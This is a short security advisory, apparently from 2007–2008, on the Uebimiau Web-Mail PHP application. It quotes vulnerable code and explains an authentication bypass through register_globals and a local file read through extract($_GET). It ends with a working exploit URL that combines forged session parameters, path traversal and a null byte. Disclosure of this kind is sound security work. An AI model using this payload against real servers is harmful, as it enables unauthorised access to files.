@@ -1,0 +1,75 @@
+----[ Uebimiau Web-Mail Remote File Reader ... ITDefence.ru Antichat.ru ]
+
+							Uebimiau Web-Mail Remote File Reader
+							Eugene Minaev underwater@itdefence.ru
+				___________________________________________________________________
+			____/  __ __ _______________________ _______  _______________    \  \   \
+			/ .\  /  /_// //              /        \       \/      __       \   /__/   /
+			/ /     /_//              /\        /       /      /         /     /___/
+			\/        /              / /       /       /\     /         /         /
+			/        /               \/       /       / /    /         /__       //\
+			\       /    ____________/       /        \/    __________// /__    // /   
+			/\\      \_______/        \________________/____/  2007    /_//_/   // //\
+			\ \\                                                               // // /
+			.\ \\        -[     ITDEFENCE.ru Security advisory     ]-         // // / . 
+			. \_\\________[________________________________________]_________//_//_/ . .
+		 
+		
+		At first i decided to look login script . Each script includes this code
+		
+		<?php
+		if(strlen($f_pass) > 0) {
+
+		..elseif (
+		($sess["auth"] && intval((time()-$start)/60) < $idle_timeout)) {
+
+		$UM->mail_user   = $f_user    = $sess["user"];
+		$UM->mail_pass   = $f_pass    = $sess["pass"];
+		$UM->mail_server = $f_server  = $sess["server"];
+		$UM->mail_email  = $f_email   = $sess["email"];
+
+		} else {
+		Header("Location: ./index.php?tid=$tid&lid=$lid\r\n"); 
+		exit; 
+		} 
+		?>
+		
+		So , if register_globals on , we can make a request like script.php?f_pass=+toxa+&sess[auth]=1 
+		to make script think that we are authorized user . Then i looked each script to find something 
+		interest.
+		
+		<?php
+		define("SMARTY_DIR","./smarty/");
+		require_once(SMARTY_DIR."Smarty.class.php");
+		$smarty = new Smarty;
+		$smarty->compile_dir = $temporary_directory;
+		$smarty->security=true;
+		$smarty->secure_dir=array("./");
+		$smarty->assign("umLanguageFile",$selected_language.".txt");  
+		?>
+		
+		Looks great  :)  But selected_language was already defined . But there was a similar code with EXTRACT.
+		So , we can read local files on server !
+		
+		<?php
+		if($phpver >= 4.1) {
+		extract($_GET);
+		}
+
+		$smarty->assign("umSid",$sid);
+		$smarty->assign("umLid",$lid);
+		$smarty->assign("umTid",$tid);
+
+		$smarty->assign("umErrorCode",$err);
+
+		$smarty->display("$selected_theme/error.htm");
+		?>
+		
+		http://test1.ru/uebimiau/error.php?f_pass=blackybr&sess[auth]=1&selected_theme=../ksuri.php%00
+		
+		
+		
+
+----[ FROM RUSSIA WITH LOVE :: underWHAT?! , gemaglabin ]
+
+# milw0rm.com [2008-01-06]
